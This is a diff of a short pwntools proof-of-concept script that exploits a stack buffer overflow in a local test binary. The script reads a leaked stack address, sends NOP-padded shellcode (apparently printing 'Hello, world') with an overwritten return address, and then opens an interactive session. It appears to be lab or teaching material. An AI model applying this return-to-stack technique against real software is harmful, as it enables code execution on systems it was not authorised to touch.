@@ -1,7 +1,8 @@
 ## python3 rts_poc.py
 
 from pwn import *
- 
+
+
 p = process('./poc')
 p.recvuntil('buf[50] address : ')
 stackAddr = p.recvuntil('\n')
@@ -12,5 +13,8 @@ exploit = b"\xe8\x0f\x00\x00\x00\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64
 exploit += b"\x90" * (72 - len(exploit))
 exploit += p64(stackAddr)
 
+pause()
+
 p.send(exploit)
-#p.interactive()
+
+p.interactive()
